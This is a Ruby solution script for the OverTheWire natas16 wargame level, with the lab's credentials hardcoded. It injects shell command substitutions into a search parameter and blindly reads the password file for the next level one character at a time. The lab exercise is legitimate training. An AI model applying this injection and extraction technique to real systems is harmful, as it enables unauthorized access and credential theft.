require 'rubygems'
require 'httparty'
require 'nokogiri'

def print_new(c)
  print c
end

def print_replacement(c)
  print "\b#{c}"
end

def query(query_params)
  url = 'http://natas16.natas.labs.overthewire.org/'
  auth = { :username => 'natas16', :password => '3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L' }

  response = HTTParty.get(url, :query => query_params, :basic_auth => auth)
  response.body
end

def query_approximate(position)
  # cut is 1-based
  position += 1
  query(:needle => "$(cut -c#{position}-#{position} /etc/natas_webpass/natas17)")
end

def unique_letters(words)
  word = words.shift
  current = word.scan(/./)
  words.each do | word |
    letters = word.scan(/./)
    current.delete_if { | c | !(letters.include?(c.upcase) || letters.include?(c.downcase)) }
  end
  return current
end

# Find an approximate answer. We know where numbers are but not what they are
# We know what letter is in which position, but not whether it is upper-case or lower-case
def find_approximate
  approximate = ''
  (0...32).each do | i |
    print_new '?'
    words = Nokogiri::XML(query_approximate(i)).xpath('//pre').text.lines.to_a.map(&:chomp).select { | w | w != '' }
    approximate << if words.length > 0
      letter = unique_letters(words).first.downcase
      print_replacement letter
      letter
    else
      '?'
    end
  end
  puts
  approximate
end

def query_exact(position, guess)
  # cut is 1-based
  position += 1
  command = <<EOS.chomp
$(echo $(if [ $(cut -c#{position}-#{position} /etc/natas_webpass/natas17) = #{guess} ]
then
echo h
else
echo qq
fi))
EOS
  Nokogiri::XML(query(:needle => command)).xpath('//pre').text.chomp.length > 0
end

def find_number(position)
  ('0'..'9').each do | num |
    print_replacement num
    return num if query_exact(position, num)
  end
end

# Find an exact answer from an existing approximate one.
# Ie. find_with_approximate(find_approximate)
def find_with_approximate(guess)
  exact = ''
  guess.each_char.with_index do | c, position |
    print_new c
    exact << if c == '?'
      find_number(position)
    else
      print_replacement c.downcase
      if query_exact(position, c.downcase)
        c.downcase
      else
        print_replacement c.upcase
        c.upcase
      end
    end
  end
  puts
  exact
end

# Find an exact answer all at once.
def find_exact
  exact = ''
  (0...32).each do | position |
    print_new '?'
    valid_characters = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
    valid_characters.each do | c |
      print_replacement c
      if query_exact(position, c)
        exact << c
        break
      end
    end
  end
  puts
  exact
end

